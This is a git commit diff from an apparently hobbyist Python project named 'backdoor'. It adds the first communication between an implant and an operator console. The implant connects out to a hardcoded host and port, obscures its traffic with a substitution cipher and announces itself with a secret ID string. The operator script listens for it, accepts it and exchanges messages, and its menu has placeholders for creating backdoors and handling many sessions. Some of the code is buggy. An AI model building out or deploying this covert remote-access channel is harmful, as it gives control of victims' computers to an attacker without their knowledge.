63e14c7bfe046f26cd7d800ff96577f1de312fc2
wi6n3l <35975131+wi6n3l@users.noreply.github.com>
2019-07-24 22:12:53 +0100

    Basic communication added
    Basic communication added

--- backdoor.py
+++ backdoor.py
@@ -1,16 +1,72 @@
-import socket, time, os
+try:
+    import os
+    import socket
+    import time
+except:
+    os.system("pip install socket")
+    os.system("pip3 install socket")
+    os.system("pip install time")
+    os.system("pip3 install time")
 
-server = "192.168.1.103" ##### Change
-port = 23125 #### Change
+encrypted = list("b^$3k/I7h=gMnCe?«*HX#PqyuJRlDUSV_w6o>YmTK2'-|aL+9zrG<5s1\%OE48icQvdxp!AtNZB W»~jf&0F")
+decrypted = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| ")
+
+server = "192.168.1.103" ##### Var
+port = 23125 #### Var
+
+def encrypt(string):
+    final = ""
+    for i in list(string):
+        n = decrypted.index(i)
+        final += encrypted[n]
+    return final
+
+def decrypt(string):
+    final = ""
+    for i in list(string):
+        n = encrypted.index(i)
+        final += decrypted[n]
+    return final
 
 try:
     server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_connection.connect((server, port))
-except:
+
+    def recive(buffer):
+        return decrypt(server_connection.recv(buffer).decode("utf-8"))
+
+    def send(str):
+        server_connection.send(encrypt(str).encode("utf-8"))
+
+    send("231Py8ackd00r231")
+    condition = True
+    while condition:
+        status = recive(1024)
+        condition = False
+
+    if status == "200":
+        send("#1024")
+        send("ola")
+        condition = True
+        while condition:
+            bff = recive(1024)
+            if bff.startswith("#"):
+                buffer = int(bff.split("#")[0])
+                print(buffer)
+                condition_msg = True
+                while condition_msg:
+                    msg = recive(buffer)
+                    condition_msg = False
+            print(msg)
+
+except Exception as e:
+    print(e)
     pass
 
 
 
 
-
-server_connection.close()
+try:
+    server_connection.close()
+except:
+    pass
--- terminal.py
+++ terminal.py
@@ -1,11 +1,29 @@
 import socket, time, os, platform
 
+encrypted = list("b^$3k/I7h=gMnCe?«*HX#PqyuJRlDUSV_w6o>YmTK2'-|aL+9zrG<5s1\%OE48icQvdxp!AtNZB W»~jf&0F")
+decrypted = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| ")
+
+def encrypt(string):
+    final = ""
+    for i in list(string):
+        n = decrypted.index(i)
+        print(encrypted[n])
+        final += encrypted[n]
+    return final
+
+def decrypt(string):
+    final = ""
+    for i in list(string):
+        n = encrypted.index(i)
+        final += decrypted[n]
+    return final
+
 global author_instagram
 author_instagram = "tchewui"
 
 class symbols():
     def __init__(self):
-        self.defaults = "\033[37m"
+        self.defaults = "\033[39m"
         self.banners = "\033[36m"
         self.credits = "\033[34mmade by \033[31m@" + author_instagram+"\033[39m"
         self.sucesss = "\033[32m[+] "
@@ -28,13 +46,13 @@ class symbols():
     def credit(self):
         return self.credits
     def sucess(self, text):
-        return self.sucesss + str(text)
+        return self.sucesss + str(text) + "\033[39m"
     def error(self, text):
-        return self.errors + str(text)
+        return self.errors + str(text) + "\033[39m"
     def warning(self, text):
-        return self.warnings + str(text)
+        return self.warnings + str(text) + "\033[39m"
     def info(self, text):
-        return self.infos + str(text)
+        return self.infos + str(text) + "\033[39m"
 
 symbols = symbols()
 
@@ -56,7 +74,47 @@ def create_backdoor():
     print(symbols.info("in progress"))
 
 def listen():
-    print(symbols.info("in progress"))
+    try:
+        #listen_port = int(input(symbols.default("Listening port : "))) ## to 65535 ###DEBUG### UNCOMMENT
+        listen_port = 23125  ##DEBUG## COMENT
+        if (listen_port > 0 and listen_port < 65535):
+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server.bind(("", listen_port))
+            server.listen(1)
+            conn, addr = server.accept()
+
+            def send(string):
+                conn.send(encrypt(string).encode("utf-8"))
+
+            def recive(buffer):
+                return decrypt(conn.recv(buffer).decode("utf-8"))
+
+            condition = True
+
+            while condition:
+                id_msg = recive(1024)
+                condition = False
+
+            print(id_msg)
+            if id_msg.startswith("231Py8ackd00r231"):
+                send("200")
+                condition = True
+                while condition:
+                    bff = recive(1024)
+                    if bff.startswith("#"):
+                        buffer = int(bff.split("#")[1])
+                        condition_msg = True
+                        while condition_msg:
+                            msg = recive(buffer)
+                            condition_msg = False
+                    print(msg)
+    except Exception as e:
+        print(e)
+        pass
+        #server = socket.socket
+
+    except KeyboardInterrupt:
+        server.close()
 
 def listen_multiple_sessions():
     print(symbols.info("in progress"))
@@ -69,20 +127,24 @@ def changeMenu():
 3. Listen Multiple Sessions
 """)
     menu = input()
-    if(menu.isnumeric() and len(menu)==1):
+    if(menu.isnumeric() and len(menu)== 1):
         current_menu = menu
     else:
         print(symbols.error("Invalid value, please try again:"))
         changeMenu()
 
-    if(current_menu == 1):
+    print(current_menu)
+
+    if(current_menu == "1"):
         create_backdoor()
-    elif(current_menu == 2):
+    elif(current_menu == "2"):
         listen()
-    elif(current_menu == 3):
+    elif(current_menu == "3"):
         listen_multiple_sessions()
     else:
         print(symbols.error("Invalid option, please select a valid one:"))
         changeMenu()
 
-changeMenu()
+#changeMenu() #DEBUG UNCOMMENT
+
+listen()###### DEBUG # COMMENT ##########
